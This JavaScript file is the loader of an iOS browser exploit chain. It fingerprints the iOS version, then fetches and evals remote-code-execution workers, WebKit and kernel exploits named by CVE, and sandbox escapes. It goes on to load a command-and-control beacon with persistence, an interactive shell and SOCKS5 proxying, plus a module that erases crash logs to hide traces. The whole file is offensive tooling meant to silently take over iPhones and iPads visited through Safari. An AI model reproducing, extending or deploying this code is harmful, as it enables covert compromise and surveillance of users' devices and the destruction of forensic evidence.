var SERVER_LOG = true;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
var localHost = location.origin;

// PARS Defense: 检查加密投递模式
const urlParams = new URLSearchParams(location.search);
const ENCRYPTED_MODE = urlParams.get('encrypted') === '1';
let parsEncryptedFetchLoaded = false;
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    }
    if (dumphex) {
        obj.hex = 1
        obj.text = x
    }
    const req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "/log.html?" + req, false);
    xhr.send(null);
}
function redirect()
{
    window.location.href = "/404.html"; 
}
function getJS(fname,method = 'GET') 
{
    try 
    {
        let url = fname;
        //(`trying to fetch ${method} from: ${url}`);
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `${url}` , false);
        xhr.send(null);
        return xhr.responseText;
    }
    catch(e)
    {
       // print("got error in getJS: " + e);
    }
}

// PARS Defense: 异步加载函数（用于加密模式）
async function getJSAsync(fname) {
    if (ENCRYPTED_MODE && typeof getJSEncrypted === 'function') {
        return await getJSEncrypted(fname);
    }
    return getJS(fname);
}
function loadBuildProfile(versionParts)
{
    if (!versionParts || versionParts.length < 2) return null;
    const versionKey = versionParts.slice(0, 2).join('.');
    const buildId = (typeof IOS_BUILD_ID !== 'undefined' && IOS_BUILD_ID) || '';
    const candidates = [];
    if (buildId) candidates.push(`/profiles/ios_${versionKey.replace('.', '_')}_${buildId}.json`);
    candidates.push(`/profiles/ios_${versionKey.replace('.', '_')}.json`);

    for (const name of candidates) {
        try {
            const raw = getJS(`${name}?${Date.now()}`);
            if (!raw) continue;
            const profile = JSON.parse(raw);
            globalThis.IOS_BUILD_PROFILES = globalThis.IOS_BUILD_PROFILES || {};
            globalThis.IOS_BUILD_PROFILES[versionKey] = profile;
            if (profile.build) globalThis.IOS_BUILD_PROFILES[profile.build] = profile;
            return profile;
        } catch(e) {}
    }
    return null;
}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = (function() {
    // Support both iPhone and iPad UA strings
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (!version) {
        // iPad reports "CPU OS" in UA
        version = /CPU OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    }
    if (version) {
        return version.split('_').map(part => parseInt(part));
    }
})();
const is_ipad = /iPad/.test(navigator.userAgent) ||
    (/Macintosh/.test(navigator.userAgent) && navigator.maxTouchPoints > 1);
let workerCode = "";
const version_str = ios_version ? ios_version.join(',') : '';
// iOS 26.x: Latest path
if(version_str.startsWith('26,'))
    workerCode = getJS(`rce_worker_26.js?${Date.now()}`);
// iOS 18.6-18.7: Specific worker
else if(version_str === '18,6' || version_str === '18,6,1' || version_str === '18,6,2' || 
        version_str === '18,7' || version_str === '18,7,1')
    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`);
// iOS 18.4-18.5: GPU process escape path (22E240/22F76)
else if(version_str === '18,4' || version_str === '18,4,1' || 
        version_str === '18,5' || version_str === '18,5,1')
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
// iOS 18.0-18.3: CVE-2025-24201 (WebKit Sandbox Escape) path
else if(version_str === '18,0' || version_str === '18,1' || 
        version_str === '18,2' || version_str === '18,3' || version_str === '18,3,1')
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
// iOS 17.4-17.5: CVE-2025-24201 path (verified in webkit_sbx_CVE-2025-24201.js)
else if(version_str === '17,4' || version_str === '17,4,1' || 
        version_str === '17,5' || version_str === '17,5,1')
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
// iOS 17.x fallback
else if(version_str.startsWith('17,'))
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
// iOS 16.x: CVE-2023 series exploits
else if(version_str.startsWith('16,'))
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
// iOS 15.x: CVE-2022-32893 (WebKit OOB write) + CVE-2022-32894 (kernel OOB)
else if(version_str.startsWith('15,'))
    workerCode = getJS(`rce_worker_15.js?${Date.now()}`);
// Default fallback
else
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                doRedirect();
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: version_str.startsWith('26,') ? 'setup_fcall_26' : 'setup_fcall'
                });
                break;
            }
            case 'fcall_ready':
            {
                globalThis.ios26_fcall_ready = true;
                globalThis.ios26_worker_status = { success: true, stage: 'fcall_ready' };
                if (typeof sendBeacon === 'function') {
                    sendBeacon({ stage: 'rce', execStatus: 'running', extra: { ios26_fcall_ready: true } });
                }
                break;
            }
            case 'ios26_worker_failed':
            {
                globalThis.ios26_fcall_ready = false;
                globalThis.ios26_worker_status = { success: false, reason: data.reason || 'worker_failed' };
                if (typeof sendBeacon === 'function') {
                    sendBeacon({ stage: 'rce', execStatus: 'failed', extra: globalThis.ios26_worker_status });
                }
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        
        // PARS Defense: 如果启用加密模式，先加载加密模块
        if (ENCRYPTED_MODE && !parsEncryptedFetchLoaded) {
            try {
                const parsCode = getJS(`pars_encrypted_fetch.js?${Date.now()}`);
                eval(parsCode);
                parsEncryptedFetchLoaded = true;
                print('[PARS Defense] Encrypted fetch module loaded');
            } catch(e) {
                print('[PARS Defense] Failed to load encrypted fetch: ' + e.message, true);
            }
        }
        
        // 将主流程包装为 async 以支持加密模式
        (async function() {
        try
        {
        // 加载模块完整性验证系统（可选）
        // 注意：完整性验证需要预先配置模块哈希值
        let integrityEnabled = false; // FORCED OFF: empty hashes cause async overhead + silent failures
        /*  DISABLED - integrity module causes silent failures
        try {
            const integrityCode = await getJSAsync(`module_integrity.js?${Date.now()}`);
            eval(integrityCode);
            integrityEnabled = typeof loadAndVerifyModule === 'function';
            if (integrityEnabled) {
                print('[Security] Module integrity verification enabled');
            }
        } catch(e) {
            print('[Security] Module integrity verification not available (optional)');
        }
        */
        
        // 安全模块加载函数
        async function safeLoadModule(filename) {
            const code = await getJSAsync(`${filename}?${Date.now()}`);
            
            if (integrityEnabled) {
                // 使用完整性验证加载
                await loadAndVerifyModule(filename, code);
            } else {
                // 降级到普通 eval（开发模式）
                eval(code);
            }
        }
        
        let rceCode = "";
        const version_str = ios_version ? ios_version.join(',') : '';
        // iOS 26.x
        if(version_str.startsWith('26,'))
                rceCode = await getJSAsync(`rce_module_26.js?${Date.now()}`);
        // iOS 18.6-18.7
        else if(version_str === '18,6' || version_str === '18,6,1' || version_str === '18,6,2' || 
                version_str === '18,7' || version_str === '18,7,1')
                rceCode = await getJSAsync(`rce_module_18.6.js?${Date.now()}`);
        // iOS 18.4-18.5: GPU process escape path
        else if(version_str === '18,4' || version_str === '18,4,1' || 
                version_str === '18,5' || version_str === '18,5,1')
                rceCode = await getJSAsync(`rce_module.js?${Date.now()}`);
        // iOS 18.0-18.3: CVE-2025-24201 path
        else if(version_str === '18,0' || version_str === '18,1' || 
                version_str === '18,2' || version_str === '18,3' || version_str === '18,3,1')
                rceCode = await getJSAsync(`rce_module.js?${Date.now()}`);
        // iOS 17.4-17.5: CVE-2025-24201 path
        else if(version_str === '17,4' || version_str === '17,4,1' || 
                version_str === '17,5' || version_str === '17,5,1')
                rceCode = await getJSAsync(`rce_module.js?${Date.now()}`);
        // iOS 16.x: CVE-2023 series
        else if(version_str.startsWith('16,'))
                rceCode = await getJSAsync(`rce_module.js?${Date.now()}`);
        // iOS 15.x: CVE-2022-32893
        else if(version_str.startsWith('15,'))
                rceCode = await getJSAsync(`rce_module_15.js?${Date.now()}`);
        // Default
            else
                rceCode = await getJSAsync(`rce_module.js?${Date.now()}`);
        try
        {
            // 使用安全加载方式 - DISABLED: integrity module adds async overhead with empty hashes
            if (false && integrityEnabled) {
                const moduleName = version_str.startsWith('26,') ? 'rce_module_26.js' 
                    : (version_str === '18,6' || version_str === '18,6,1' || version_str === '18,6,2' || version_str === '18,7' || version_str === '18,7,1') 
                    ? 'rce_module_18.6.js'
                    : (version_str === '18,4' || version_str === '18,4,1' || version_str === '18,5' || version_str === '18,5,1')
                    ? 'rce_module.js'
                    : (version_str === '18,0' || version_str === '18,1' || version_str === '18,2' || version_str === '18,3' || version_str === '18,3,1')
                    ? 'rce_module.js'
                    : (version_str === '17,4' || version_str === '17,4,1' || version_str === '17,5' || version_str === '17,5,1')
                    ? 'rce_module.js'
                    : 'rce_module.js';
                await loadAndVerifyModule(moduleName, rceCode);
            } else {
                try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] about to eval rceCode len=' + rceCode.length)); } catch(e){}
                eval(rceCode);
                try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] rceCode eval done, check_attempt=' + (typeof check_attempt))); } catch(e){}
            }
        }
        catch(e)
        {
            try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] rceCode eval EXCEPTION: ' + e.message)); } catch(e2){}
            //print("Got exception while running rce: " + e);
        }

        // Load beacon.js for device reporting and command polling
        // 优先加载 beacon.build.js（已注入 DS_SHARED_SECRET），回退到 beacon.js
        try {
            let beaconCode = null;
            if (integrityEnabled) {
                await safeLoadModule('beacon.build.js').catch(() => safeLoadModule('beacon.js'));
            } else {
                beaconCode = await getJSAsync(`beacon.build.js?${Date.now()}`).catch(() => null);
                if (!beaconCode) {
                    beaconCode = await getJSAsync(`beacon.js?${Date.now()}`);
                }
                eval(beaconCode);
            }
            if (typeof sendBeacon === 'function') {
                sendBeacon({ stage: 'rce', execStatus: 'running' });
            }
        } catch(e) {}

        // Load extended beacon commands (file ops, persist, monitoring, network)
        try {
            const extCmdsCode = await getJSAsync(`beacon_commands_extended.js?${Date.now()}`);
            eval(extCmdsCode);
            // Merge EXTENDED_COMMANDS into beacon's CMD_HANDLERS
            if (typeof EXTENDED_COMMANDS !== 'undefined' && typeof CMD_HANDLERS !== 'undefined') {
                Object.assign(CMD_HANDLERS, EXTENDED_COMMANDS);
                print('[rce_loader] ✓ Extended beacon commands merged');
            }
        } catch(e) {}

        // Load beacon complete integration (interactive shell, socks5, etc)
        try {
            const integrationCode = await getJSAsync(`beacon_complete_integration.js?${Date.now()}`);
            eval(integrationCode);
            print('[rce_loader] ✓ Beacon complete integration loaded');
        } catch(e) {}

        // Load exploit selector and fallback executor (must load before orchestrator)
        try {
            if (integrityEnabled) {
                await safeLoadModule('exploit_selector.js');
            } else {
                const selectorCode = await getJSAsync(`exploit_selector.js?${Date.now()}`);
                eval(selectorCode);
            }
            print('[rce_loader] ✓ ExploitSelector loaded');
        } catch(e) {
            print('[rce_loader] ✗ ExploitSelector load failed: ' + e.message);
        }

        try {
            if (integrityEnabled) {
                await safeLoadModule('fallback_executor.js');
            } else {
                const executorCode = await getJSAsync(`fallback_executor.js?${Date.now()}`);
                eval(executorCode);
            }
            print('[rce_loader] ✓ FallbackExecutor loaded');
        } catch(e) {
            print('[rce_loader] ✗ FallbackExecutor load failed: ' + e.message);
        }

        try {
            if (integrityEnabled) {
                await safeLoadModule('plugin_loader.js');
            } else {
                const pluginLoaderCode = await getJSAsync(`plugin_loader.js?${Date.now()}`);
                eval(pluginLoaderCode);
            }
            print('[rce_loader] ✓ PluginLoader loaded');
        } catch(e) {
            print('[rce_loader] ✗ PluginLoader load failed: ' + e.message);
        }

        try {
            if (integrityEnabled) {
                await safeLoadModule('exploit_registry.js');
            } else {
                const registryCode = await getJSAsync(`exploit_registry.js?${Date.now()}`);
                eval(registryCode);
            }
            print('[rce_loader] ✓ ExploitRegistry loaded');
        } catch(e) {
            print('[rce_loader] ✗ ExploitRegistry load failed: ' + e.message);
        }

        // Load metric collector for A/B testing
        try {
            if (integrityEnabled) {
                await safeLoadModule('metric_collector.js');
            } else {
                const metricCode = await getJSAsync(`metric_collector.js?${Date.now()}`);
                eval(metricCode);
            }
            print('[rce_loader] ✓ MetricCollector loaded');
        } catch(e) {
            print('[rce_loader] ✗ MetricCollector load failed: ' + e.message);
        }

        // Load native bridge (requires Native global from pe_main.js)
        // Must load BEFORE ghostknife.js which depends on nativeExecShell
        try {
            const nativeBridgeCode = await getJSAsync(`native_bridge.js?${Date.now()}`);
            eval(nativeBridgeCode);
        } catch(e) {}

        // Load ghostknife (forensic cleanup: crash logs + DiagnosticReports)
        // Loaded AFTER native_bridge.js so nativeExecShell is available
        try {
            const ghostknifeCode = await getJSAsync(`ghostknife.js?${Date.now()}`);
            eval(ghostknifeCode);
        } catch(e) {}
        
        // Load exploit enhancement modules
        try {
            const coreaudioModule = await getJSAsync(`coreaudio_trigger_CVE-2025-31200.js?${Date.now()}`);
            eval(coreaudioModule);
            if (typeof initCoreAudioExploit === 'function') {
                initCoreAudioExploit();
            }
        } catch(e) {}
        
        try {
            const angleModule = await getJSAsync(`angle_webgl_CVE-2025-14174.js?${Date.now()}`);
            eval(angleModule);
            if (typeof initANGLEExploit === 'function') {
                initANGLEExploit();
            }
        } catch(e) {}
        
        try {
            const kernelModule = await getJSAsync(`kernel_priv_CVE-2025-43520.js?${Date.now()}`);
            eval(kernelModule);
            if (typeof initKernelPrivEsc === 'function') {
                // initKernelPrivEsc deferred: requires p.dlsym (RCE primitive) first
                // initKernelPrivEsc();
            }
        } catch(e) {}

        // Load WebKit UAF exploit (CVE-2025-43529, iOS 17.4-26.1)
        try {
            const webkitUAFModule = await getJSAsync(`webkit_uaf_CVE-2025-43529.js?${Date.now()}`);
            eval(webkitUAFModule);
            print('[rce_loader] ✓ CVE-2025-43529 (WebKit UAF) loaded');
        } catch(e) {
            print('[rce_loader] ✗ CVE-2025-43529 load failed: ' + e.message);
        }
        
        // Load iOS 16 exploits (CVE-2023-23531, CVE-2023-32439, CVE-2023-37450)
        if (version_str.startsWith('16,')) {
            try {
                const ios16Module = await getJSAsync(`webkit_ios16_exploits.js?${Date.now()}`);
                eval(ios16Module);
                print('[rce_loader] ✓ iOS 16 exploits loaded');
            } catch(e) {
                print('[rce_loader] ✗ iOS 16 exploits load failed: ' + e.message);
            }
        }
        
        // Load WebKit sandbox escape (CVE-2025-24201, alt path for iOS < 18.3.2)
        try {
            const webkitSbxModule = await getJSAsync(`webkit_sbx_CVE-2025-24201.js?${Date.now()}`);
            eval(webkitSbxModule);
        } catch(e) {}

        // Load BCMWLAN privilege escalation (AMPDU subframe confusion)
        try {
            const bcmwlanModule = await getJSAsync(`bcmwlan_priv_escalation.js?${Date.now()}`);
            eval(bcmwlanModule);
        } catch(e) {}

        // Load BCM4387 Bluetooth pivot (SRAM write + HCI injection)
        try {
            const btPivotModule = await getJSAsync(`bcm4387_bt_pivot.js?${Date.now()}`);
            eval(btPivotModule);
        } catch(e) {}
        
        // Load sandbox escape modules (sbx0 for dyld, sbx1 for kernel R/W)
        // These must load BEFORE orchestrator so gpuRead64/kernelRead64 are available
        try {
            if (version_str.startsWith('26,')) {
                // iOS 26: dyld4 split-cache sandbox escape path
                print('[rce_loader] Loading sbx0_main_26.js for iOS 26 sandbox escape...');
                const sbx0Module = await getJSAsync(`sbx0_main_26.js?${Date.now()}`);
                eval(sbx0Module);
                print('[rce_loader] ✓ sbx0_main_26.js loaded');
            } else if (version_str.startsWith('15,')) {
                // iOS 15.x: IOSurface OOB write sandbox escape
                print('[rce_loader] Loading sbx0_main_15.js for iOS 15 sandbox escape...');
                const sbx0Module = await getJSAsync(`sbx0_main_15.js?${Date.now()}`);
                eval(sbx0Module);
                print('[rce_loader] ✓ sbx0_main_15.js loaded');
            } else {
                // iOS 16.x - 18.x: GPU process escape path
                print('[rce_loader] Loading sbx0_main_18.4.js for sandbox escape...');
                const sbx0Module = await getJSAsync(`sbx0_main_18.4.js?${Date.now()}`);
                eval(sbx0Module);
                print('[rce_loader] ✓ sbx0_main_18.4.js loaded');
            }
        } catch(e) {
            print('[rce_loader] ✗ sbx0 load failed: ' + e.message);
        }
        
        try {
            if (version_str.startsWith('26,')) {
                // iOS 26: IOSurface kernel R/W (new interface)
                print('[rce_loader] Loading sbx1_main_26.js for iOS 26 kernel R/W...');
                const sbx1Module = await getJSAsync(`sbx1_main_26.js?${Date.now()}`);
                eval(sbx1Module);
                print('[rce_loader] ✓ sbx1_main_26.js loaded');
            } else if (version_str.startsWith('15,')) {
                // iOS 15.x: kernel R/W via CVE-2022-32917
                print('[rce_loader] Loading sbx1_main_15.js for iOS 15 kernel R/W...');
                const sbx1Module = await getJSAsync(`sbx1_main_15.js?${Date.now()}`);
                eval(sbx1Module);
                print('[rce_loader] ✓ sbx1_main_15.js loaded');
            } else {
                // iOS 16.x - 18.x: IOSurface kernel R/W
                print('[rce_loader] Loading sbx1_main.js for kernel R/W...');
                const sbx1Module = await getJSAsync(`sbx1_main.js?${Date.now()}`);
                eval(sbx1Module);
                print('[rce_loader] ✓ sbx1_main.js loaded');
            }
        } catch(e) {
            print('[rce_loader] ✗ sbx1 load failed: ' + e.message);
        }
        
        // Load attack chain orchestrator (must load AFTER sbx0/sbx1 to access primitives)
        try {
            const orchestratorModule = await getJSAsync(`attack_chain_orchestrator.js?${Date.now()}`);
            eval(orchestratorModule);
            print('[rce_loader] ✓ AttackChainOrchestrator loaded');
        } catch(e) {
            print('[rce_loader] ✗ AttackChainOrchestrator load failed: ' + e.message);
        }
        
        // Load optional enhancement modules
        try {
            const safariModule = await getJSAsync(`safari_redirect.js?${Date.now()}`);
            eval(safariModule);
        } catch(e) {}
        
        try {
            const fingerprintModule = await getJSAsync(`pars_fingerprint.js?${Date.now()}`);
            eval(fingerprintModule);
        } catch(e) {}
        
        let desiredHost = "";
        desiredHost = localHost;
        // iPad (iPadOS) reports "CPU OS" in UA; is_ipad flag set at loader init
            if(version_str.startsWith('26,'))
            {
                let ios26Result = null;
                try {
                    const profile = loadBuildProfile(ios_version);
                    if (!profile) {
                        throw new Error('missing build-specific dyld profile');
                    }
                    if (typeof initIOS26RCE !== 'function') {
                        throw new Error('initIOS26RCE not available');
                    }
                    ios26Result = initIOS26RCE(ios_version.slice(0, 2).join('.'));
                    globalThis.ios26_init_status = ios26Result;
                } catch (e) {
                    ios26Result = { success: false, error: e.message };
                    globalThis.ios26_init_status = ios26Result;
                }

                if (!ios26Result || ios26Result.success !== true) {
                    print(`[iOS26 Loader] primitive init failed: ${ios26Result ? ios26Result.error : 'unknown'}`, true);
                    if (typeof sendBeacon === 'function') {
                        sendBeacon({ stage: 'rce', execStatus: 'failed', extra: { ios26_init: ios26Result || { success: false } } });
                    }
                    return;
                }

                // Primitives are function-backed and cannot cross Worker boundary.
                // They remain on main thread; only serializable profile data is sent.
                // The worker builds its own read/write from JOP chain + profile gadgets.
                
                // 初始化 worker 状态为 pending
                globalThis.ios26_worker_status = { success: false, pending: true };

                worker.postMessage({
                    type: 'stage1_ios26',
                    desiredHost,
                    randomValues,
                    SERVER_LOG,
                    ios26_offsets: ios26Result.offsets,
                    ios26_dyld: ios26Result.dyld,
                    ios26_symbols: ios26Result.symbols,
                    ios26_gadgets: ios26Result.gadgets
                });
            }
            else if(version_str === '18,6' || version_str === '18,6,1' || version_str === '18,6,2' || version_str === '18,7' || version_str === '18,7,1')
            {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG
                });
            }
            else 
            {
        // Diagnostic: confirm code reaches check_attempt (async beacon, non-blocking)
        try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] REACHED check_attempt path for ' + version_str)); } catch(e){}
        try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] about to new check_attempt()')); } catch(e){}
        var attempt = new check_attempt();
        try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] check_attempt instantiated OK')); } catch(e){}
        const MAX_RCE_RETRIES = 5;
        let rce_success = false;
        for (let _retry = 0; _retry < MAX_RCE_RETRIES; _retry++) {
            try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] RCE loop iter=' + (_retry+1))); } catch(e){}
            print("[rce_loader] RCE attempt " + (_retry+1) + "/" + MAX_RCE_RETRIES);
            try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] calling attempt.start() iter=' + (_retry+1))); } catch(e){}
            let result = await attempt.start();
            try { navigator.sendBeacon('/log.html?text=' + encodeURIComponent('[DIAG] attempt.start() returned: ' + result)); } catch(e){}
            if (result) {
                rce_success = true;
                print("[rce_loader] RCE SUCCESS on attempt " + (_retry+1));
                worker.postMessage({
                    type: 'stage1',
                    begin,
                    origin,
                    ios_version,
                    is_ipad,
                    offsets,
                    slide,
                    chipset,
                    device_model,
                    desiredHost,
                    SERVER_LOG
                });
                break;
            }
            print("[rce_loader] RCE attempt " + (_retry+1) + " failed, retrying...");
            attempt = new check_attempt();
        }
        if (!rce_success) {
            print("[rce_loader] RCE FAILED after " + MAX_RCE_RETRIES + " attempts");
        }
            }
        }
        catch(e)
        {
        print("[rce_loader] Got exception: " + e);
        }
        })(); // 结束 async IIFE
    }
    main();
  })();
